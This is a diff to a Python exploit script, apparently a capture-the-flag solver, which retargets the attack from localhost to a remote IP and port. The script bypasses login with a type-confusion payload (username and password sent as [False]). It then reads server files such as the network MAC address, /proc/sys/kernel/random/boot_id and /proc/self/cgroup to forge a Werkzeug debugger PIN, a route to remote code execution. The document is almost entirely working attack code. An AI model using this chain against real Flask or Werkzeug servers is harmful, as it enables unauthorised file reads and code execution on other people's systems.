@@ -2,8 +2,8 @@ import requests
 
 from werkzeug_pin import create_random_id,parse_arp_file, parse_mac_address, resolve_pin
 
-TARGET = "localhost"
-PORT = 1337
+TARGET = "94.237.55.149"
+PORT = 41620
 
 def authenticate(session: requests.Session) -> requests.Response:
     payload = {"username": [False],"password": [False]}
@@ -27,7 +27,7 @@ def main():
     device_id = arp_entries[0].get('device')
     mac_address_hex = request_file(f"/sys/class/net/{device_id}/address", session)
     mac_address = parse_mac_address(mac_address_hex)
-    boot_id = request_file("/proc/sys/kernel/random/boot_id", session)
+    boot_id = request_file("/proc/sys/kernel/random/boot_id", session).strip()
     # machine_id = request_file("/etc/machine-id", session)
     machine_id = None
     cgroup_file = request_file("/proc/self/cgroup", session)
